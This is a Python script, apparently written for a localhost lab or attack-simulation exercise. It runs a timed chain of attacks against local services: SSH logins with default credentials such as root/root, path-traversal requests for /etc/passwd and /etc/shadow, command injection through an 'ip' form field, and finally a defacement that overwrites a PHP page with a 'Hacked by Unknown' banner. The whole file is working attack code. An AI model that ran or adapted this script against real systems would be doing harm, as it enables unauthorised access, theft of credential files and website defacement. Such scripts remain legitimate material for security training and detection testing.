import time
import paramiko
import requests

# Variables for hostname and port numbers
HOSTNAME = 'localhost'
SSH_PORT = 21022
HTTP_PORT_80 = 21080
HTTP_PORT_81 = 21081

# Function to attempt SSH login
def ssh_login(hostname, port, username, password):
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(hostname, port=port, username=username, password=password)
        print(f"SSH login successful for {username}")
        client.close()
    except Exception as e:
        print(f"SSH login failed for {username}: {e}")

# Attempt SSH logins after 10 minutes
def ssh_logins():
    print("Attempting SSH logins...")
    ssh_login(HOSTNAME, SSH_PORT, 'root', 'root')
    ssh_login(HOSTNAME, SSH_PORT, 'user3', 'user3')
    ssh_login(HOSTNAME, SSH_PORT, 'user8', 'user8')
    ssh_login(HOSTNAME, SSH_PORT, 'user10', 'user10')

# Sends file requests after 15 minutes
def send_file_requests():
    urls = [
        f"http://{HOSTNAME}:{HTTP_PORT_80}/?file=../index.php",
        f"http://{HOSTNAME}:{HTTP_PORT_80}/?file=../../../../../etc/passwd",
        f"http://{HOSTNAME}:{HTTP_PORT_80}/?file=../../../../../etc/shadow"
    ]
    
    for url in urls:
        try:
            response = requests.get(url)
            print(f"Requested {url}, Response Code: {response.status_code}")
        except Exception as e:
            print(f"Error requesting {url}: {e}")

# After 20 minutes, sends request to specific file and checks for "devpass" in the response
def check_devpass_in_memo():
    url = f"http://{HOSTNAME}:{HTTP_PORT_80}/?file=../memo.txt"
    try:
        response = requests.get(url)
        if "devpass" in response.text:
            print(f"'devpass' found in response from {url}")
        else:
            print(f"'devpass' not found in response from {url}")
    except Exception as e:
        print(f"Error requesting {url}: {e}")

# Attempts command injection after 25 minutes
def command_injection_requests():
    url = f"http://{HOSTNAME}:{HTTP_PORT_81}/"
    commands = ['id', 'whoami', 'ls']
    
    for command in commands:
        data = {'ip': f'; {command}'}
        try:
            response = requests.post(url, data=data)
            print(f"POST {command}, Response Code: {response.status_code}, Output: {response.text}")
        except Exception as e:
            print(f"Error with POST {command}: {e}")

# Attempts to modify ping-checker page after 30 minutes
def modify_ping_checker():
    url = f"http://{HOSTNAME}:{HTTP_PORT_81}/"
    payload = ('<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" '
               'content="width=device-width, initial-scale=1.0"><title>Hacked by Unknown</title><style>'
               'body {background-color: black;color: red;text-align: center;font-family: Arial, sans-serif;'
               'margin: 0;padding: 0;}h1 {margin-top: 20%;font-size: 60px;}p {font-size: 24px;}</style>'
               '</head><body><h1>Hacked by Unknown</h1><p>Your website is compromised.</p>'
               '<p>Take action immediately!</p></body></html>')

    data = {'ip': f'; echo "{payload}" > /var/www/html/ping-checker/index.php'}
    
    try:
        response = requests.post(url, data=data)
        print(f"POST modify request, Response Code: {response.status_code}")
        # Check if the page was modified
        time.sleep(5)
        modified_page = requests.get(url)
        print(modified_page.text)
        if "Hacked by Unknown" in modified_page.text:
            print("Page modified successfully, 'Hacked by Unknown' found")
        else:
            print("Failed to modify page")
    except Exception as e:
        print(f"Error with POST modify request: {e}")

# Main function
def main():
    print("Script started. Waiting 10 minutes for SSH login attempts...")
    # time.sleep(600)  # Wait 10 minutes
    time.sleep(10) 
    ssh_logins()
    
    print("Waiting 5 minutes for file requests...")
    # time.sleep(300)  # Wait 5 minutes
    time.sleep(10) 
    send_file_requests()
    
    print("Waiting 5 minutes for devpass check in memo.txt...")
    # time.sleep(300)  # Wait 5 minutes
    time.sleep(10) 
    check_devpass_in_memo()
    
    print("Waiting 5 minutes for command injection tests...")
    # time.sleep(300)  # Wait 5 minutes
    time.sleep(10) 
    command_injection_requests()
    
    print("Waiting 5 minutes for page modification...")
    # time.sleep(300)  # Wait 5 minutes
    time.sleep(10) 
    modify_ping_checker()

# Execute
if __name__ == "__main__":
    main()
